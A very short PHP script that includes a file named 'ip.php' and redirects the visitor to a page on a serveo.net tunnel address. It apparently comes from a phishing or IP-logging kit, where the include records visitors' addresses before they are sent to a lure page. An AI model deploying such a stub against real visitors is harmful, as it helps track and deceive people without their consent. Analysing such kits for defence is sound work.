<?php
include 'ip.php';
header('Location: https://sordes.serveo.net/true.html');
exit
?>
